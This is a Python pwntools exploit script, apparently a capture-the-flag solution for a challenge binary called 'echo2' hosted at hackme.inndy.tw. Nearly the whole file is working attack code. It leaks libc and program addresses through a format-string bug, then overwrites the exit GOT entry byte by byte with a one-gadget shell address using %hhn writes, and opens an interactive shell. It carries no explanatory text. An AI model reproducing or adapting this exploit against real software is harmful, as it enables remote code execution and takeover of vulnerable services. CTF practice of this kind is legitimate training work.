#!/usr/bin/env python
# encoding: utf-8

from pwn import *
from sys import argv
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
context.bits = 64
elf = ELF('./echo2')

if argv[1] == 'l':
    io = process('./echo2')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    exesh = 0x3f2d6
    lsm_off = 241
    raw_input()
else:
    io = remote('hackme.inndy.tw', 7712)
    libc = ELF('../libc-2.23.so.x86_64')
    exesh = 0x45206
    lsm_off = 240

pay1 = '%43$p->%47$p<<'
io.sendline(pay1)
# print io.recv()
l_s_m_addr = int(io.recvuntil('->').replace('->', ''), 16) - lsm_off # why is no same?
main_addr = int(io.recvuntil('<<').replace('<<', ""), 16)

libc_base = l_s_m_addr - libc.symbols['__libc_start_main']
elf_base = main_addr - elf.symbols['main']
print 'liba base -> ' + hex(libc_base)
print 'elf_base -> '  + hex(elf_base)

sys_addr = libc_base + libc.symbols['system']
printf_addr = libc_base + libc.symbols['printf']
printf_got = elf.got['printf'] + elf_base
system_plt = elf.plt['system'] + elf_base
exesh = libc_base + exesh   # from /bin/sh
exit_got = elf.got['exit'] + elf_base
print 'exit got -> ' + hex(exit_got)
print 'exesh -> ' + hex(exesh)
 
# payload = fmtstr_payload(18,{printf_got: sys_addr})
# payload = fmtstr_payload(18, {exit_got: exesh})
payload1 = '%' + str(exesh&0xff) + 'c%8$hhn'
payload1 = payload1.ljust(16, 'a') + p64(exit_got)
# payload += '%' + str(exesh>>8 & 0xff + 0x100) + 'c%19$hhn'
io.sendline(payload1)

payload2 = '%' + str(exesh >> 8 & 0xff) + 'c%8$hhn'
payload2 = payload2.ljust(16,'b') + p64(exit_got + 1)
io.sendline(payload2)

payload3 = '%' + str(exesh >> 16 & 0xff) + 'c%8$hhn'
payload3 = payload3.ljust(16,'c') + p64(exit_got + 2)
io.sendline(payload3)

payload4 = '%' + str(exesh >> 24 & 0xff) + 'c%8$hhn'
payload4 = payload4.ljust(16,'d') + p64(exit_got + 3)
io.sendline(payload4)

payload5 = '%' + str(exesh >> 32 & 0xff) + 'c%8$hhn'
payload5 = payload5.ljust(16,'e') + p64(exit_got + 4)
io.sendline(payload5) 

payload6 = '%' + str(exesh >> 40 & 0xff) + 'c%8$hhn'
payload6 = payload6.ljust(16,'f') + p64(exit_got + 5)
io.sendline(payload6)

payload7 = '%' + str(exesh >> 48 & 0xff) + 'c%8$hhn'
payload7 = payload7.ljust(16,'g') + p64(exit_got + 6)
# io.sendline(payload7) 

payload8 = '%' + str(exesh >> 56 & 0xff) + 'c%8$hhn'
payload8 = payload8.ljust(16,'h') + p64(exit_got + 7)
# io.sendline(payload8)

# addr = payload[0:64]
# fmt = payload[64::].ljust(96,'a')
# fmt = '%19p' + fmt

# payload = fmt+addr

# print 'payload -> ' + payload
# print len(payload)

# io.sendline(payload)
io.sendline('exit')
io.interactive()
io.close()

# print io.recv()
# -> 0x7fe341f7e2b10x55f058dad9b9


